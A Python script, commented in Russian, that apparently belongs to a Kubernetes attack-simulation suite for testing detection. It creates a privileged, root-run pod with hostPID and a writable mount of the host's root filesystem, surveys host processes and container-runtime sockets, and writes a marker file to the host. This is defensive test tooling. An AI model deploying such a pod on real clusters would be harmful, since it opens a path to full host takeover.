"""
s3_privileged_pod.py — T1611 Escape to Host
===========================================

Создаёт privileged pod с hostPID=true и монтированием hostPath.
Под существует 3 минуты, имитируя попытку побега из контейнера.

Ожидаемые сигналы:
  Audit:    feat_new_pod_count, feat_write_sensitive_count
            (pod creation с securityContext.privileged=true)
  Metrics:  feat_pods_pending → feat_pods_running (новый под появился)
            feat_deployment_deficit если не взлетит
  Logs:     feat_unseen_templates (новые процессы, mount операции)

ПРИМЕЧАНИЕ: под запускается с privileged=true но не выполняет реальных
деструктивных действий на хосте. Просто читает /proc и /sys.
"""

import subprocess
import time

POD_NAME = "attack-privileged-escape"

POD_MANIFEST = f"""
apiVersion: v1
kind: Pod
metadata:
  name: {POD_NAME}
  labels:
    app: {POD_NAME}
    attack-scenario: s3-privileged-pod
spec:
  restartPolicy: Never
  # hostPID: true позволяет видеть процессы хоста (T1611)
  hostPID: true
  containers:
  - name: escape
    image: debian:slim
    # Читаем /proc (процессы хоста), /sys, монтированный hostPath
    # Ничего деструктивного — только имитация разведки после побега
    command:
    - /bin/sh
    - -c
    - |
      echo "[attack] Privileged pod started. Simulating host escape reconnaissance..."
      echo "[attack] Listing host processes via /proc..."
      ls /proc | grep '^[0-9]' | wc -l
      echo "[attack] Reading host OS info..."
      cat /proc/version 2>/dev/null || true
      cat /proc/cpuinfo 2>/dev/null | head -20 || true
      echo "[attack] Scanning host filesystem mounts..."
      cat /proc/mounts 2>/dev/null | head -30 || true
      echo "[attack] Checking for docker/containerd sockets on host..."
      ls /host-root/var/run/ 2>/dev/null || true
      ls /host-root/run/containerd/ 2>/dev/null || true
      echo "[attack] Writing to host temp (simulated)..."
      touch /host-root/tmp/attacked_$(date +%s) 2>/dev/null || echo "write blocked"
      echo "[attack] Sleeping to maintain presence for 3 minutes..."
      sleep 180
      echo "[attack] Done."
    securityContext:
      privileged: true
      allowPrivilegeEscalation: true
      runAsUser: 0
    volumeMounts:
    - name: host-root
      mountPath: /host-root
      readOnly: false
    resources:
      requests:
        cpu: "100m"
        memory: "64Mi"
  volumes:
  - name: host-root
    hostPath:
      path: /
      type: Directory
"""

ATTACK_DURATION = 200  # чуть меньше 3 минут


def run(namespace: str = "default", dry_run: bool = False):
    print(f"[S3] Deploying privileged pod '{POD_NAME}' in namespace '{namespace}'...")
    print(f"     hostPID=true, privileged=true, hostPath=/")
    print(f"     Duration: {ATTACK_DURATION}s")

    if dry_run:
        print("[DRY] Would create privileged pod with hostPID=true and hostPath mount")
        print(f"      Duration: {ATTACK_DURATION}s")
        print(f"      kubectl delete pod/{POD_NAME}")
        return

    _apply(POD_MANIFEST, namespace)

    print("[S3] Waiting for pod to start...")
    _wait_for_pod(POD_NAME, namespace, timeout=60)

    print(f"[S3] Pod running. Maintaining for {ATTACK_DURATION}s...")
    print(f"     Watch: kubectl logs -f {POD_NAME} -n {namespace}")
    time.sleep(ATTACK_DURATION)

    print("[S3] Cleaning up...")
    cleanup(namespace)


def cleanup(namespace: str = "default"):
    print(f"[S3] Deleting privileged pod {POD_NAME}...")
    subprocess.run(
        ["kubectl", "delete", "pod", POD_NAME, "-n", namespace,
         "--ignore-not-found", "--grace-period=0", "--force"],
        capture_output=True
    )
    print("[S3] Cleanup done.")


def _apply(manifest: str, namespace: str):
    cmd = ["kubectl", "apply", "-n", namespace, "-f", "-"]
    result = subprocess.run(cmd, input=manifest.encode(), capture_output=True)
    if result.returncode != 0:
        raise RuntimeError(f"kubectl apply failed: {result.stderr.decode()}")
    print(f"     {result.stdout.decode().strip()}")


def _wait_for_pod(name: str, namespace: str, timeout: int = 60):
    deadline = time.time() + timeout
    while time.time() < deadline:
        result = subprocess.run(
            ["kubectl", "get", "pod", name, "-n", namespace,
             "-o", "jsonpath={.status.phase}"],
            capture_output=True, text=True
        )
        phase = result.stdout.strip()
        if phase == "Running":
            print(f"     Pod phase: Running ✓")
            return
        print(f"     Phase: {phase or 'Pending'}...")
        time.sleep(5)
    print("     ⚠️  Timeout — pod may still be starting")
